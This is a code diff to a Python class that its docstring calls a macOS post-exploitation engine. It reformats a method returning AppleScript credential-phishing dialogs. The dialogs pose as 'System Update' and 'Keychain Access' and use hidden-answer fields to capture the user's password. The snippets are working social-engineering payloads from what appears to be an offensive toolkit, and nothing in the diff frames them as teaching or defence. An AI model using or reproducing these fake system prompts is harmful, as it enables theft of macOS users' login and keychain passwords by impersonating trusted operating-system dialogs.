@@ -14,6 +14,7 @@
 
 from typing import List, Dict
 
+
 class MacOSIntelligence:
     """Intelligence engine for macOS-specific enumeration and post-exploitation."""
 
@@ -21,8 +22,15 @@ class MacOSIntelligence:
     def get_phishing_scripts() -> Dict[str, str]:
         """AppleScript snippets for credential phishing."""
         return {
-            "system_update_phish": 'display dialog "System Update requires your password to continue." default answer "" with title "System Update" with icon caution with hidden answer',
-            "keychain_access_phish": 'display dialog "Keychain Access wants to use the \"login\" keychain. Please enter the keychain password." default answer "" with title "Keychain Access" with icon caution with hidden answer'
+            "system_update_phish": (
+                'display dialog "System Update requires your password to continue." '
+                'default answer "" with title "System Update" with icon caution with hidden answer'
+            ),
+            "keychain_access_phish": (
+                'display dialog "Keychain Access wants to use the \\"login\\" keychain. '
+                'Please enter the keychain password." default answer "" with title "Keychain Access" '
+                'with icon caution with hidden answer'
+            )
         }
 
     @staticmethod
